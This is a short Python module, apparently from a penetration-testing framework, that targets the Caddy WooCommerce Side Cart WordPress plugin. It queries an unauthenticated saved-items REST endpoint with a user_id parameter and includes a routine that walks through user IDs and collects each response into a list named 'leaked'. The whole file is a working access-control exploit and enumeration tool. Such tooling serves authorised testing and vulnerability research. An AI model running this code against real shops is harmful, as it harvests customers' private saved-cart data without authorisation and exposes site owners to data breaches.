#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Caddy WooCommerce Side Cart REST helpers."""

from __future__ import annotations

import json
from typing import Any, List, Optional

from core.framework.base_module import BaseModule

SAVED_ITEMS_PATH = "/wp-json/caddy/v1/saved-items/"


class Caddy_sidecart(BaseModule):
    """Unauthenticated saved-items REST access."""

    def caddy_saved_items(self, user_id: int) -> tuple[int, Any]:
        resp = self.http_request(
            "GET",
            SAVED_ITEMS_PATH,
            params={"user_id": int(user_id)},
            timeout=15,
        )
        if not resp:
            return 0, None
        code = int(resp.status_code or 0)
        try:
            payload = resp.json()
        except Exception:
            try:
                payload = json.loads(resp.text or "")
            except Exception:
                payload = resp.text
        return code, payload

    def caddy_endpoint_open(self, user_id: int = 1) -> bool:
        code, payload = self.caddy_saved_items(user_id)
        return code == 200

    def caddy_enumerate_saved(self, max_id: int = 20) -> List[dict]:
        leaked: List[dict] = []
        for uid in range(1, max(1, int(max_id)) + 1):
            code, payload = self.caddy_saved_items(uid)
            if code != 200 or not payload:
                continue
            leaked.append({"user_id": uid, "data": payload})
        return leaked